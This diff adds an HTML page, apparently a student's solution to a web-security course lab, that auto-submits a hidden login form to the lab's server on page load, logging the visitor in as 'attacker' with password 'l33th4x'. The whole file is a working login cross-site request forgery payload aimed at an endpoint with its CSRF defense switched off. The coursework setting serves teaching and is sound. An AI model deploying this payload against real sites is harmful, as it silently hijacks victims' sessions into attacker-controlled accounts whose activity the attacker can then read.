@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" method="POST">
+      <input id="username" type="text" name="username" value="attacker" />
+      <input id="userpass" type="password" name="password" value="l33th4x" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
